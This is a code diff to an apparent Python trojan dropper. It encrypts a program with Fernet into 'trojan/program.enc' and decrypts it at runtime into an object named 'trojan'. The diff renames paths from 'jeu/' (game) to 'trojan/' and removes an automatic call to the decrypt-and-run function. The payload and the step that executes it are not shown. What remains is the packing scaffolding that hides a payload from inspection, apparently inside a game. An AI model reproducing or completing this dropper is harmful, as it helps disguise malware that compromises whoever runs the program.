@@ -1,5 +1,6 @@
 import subprocess
 from cryptography.fernet import Fernet
+import os
 
 def resource_path(relative_path):
     import sys, os
@@ -21,17 +22,18 @@ def encryptFILE():
     f =Fernet (key)
     encrypted = f.encrypt(original)
 
-    with open(resource_path("jeu/trojan/program.enc"), "wb") as file:
+
+    with open(resource_path("trojan/program.enc"), "wb") as file:
         file.write(encrypted)
 
 
 def decryptAndRun():
-    with open(resource_path("jeu/key.txt"), 'rb') as file:
+    with open(resource_path("trojan/key.txt"), 'rb') as file:
         key = file.read()
 
     f =Fernet (key)
 
-    with open(resource_path("jeu/program.enc"), 'rb') as encrypted_file:
+    with open(resource_path("trojan/program.enc"), 'rb') as encrypted_file:
         encrypted = encrypted_file.read()
 
     decrypted = f.decrypt(encrypted)
@@ -50,5 +52,3 @@ def decryptAndRun():
 	)
     
     return trojan
-
-decryptAndRun()
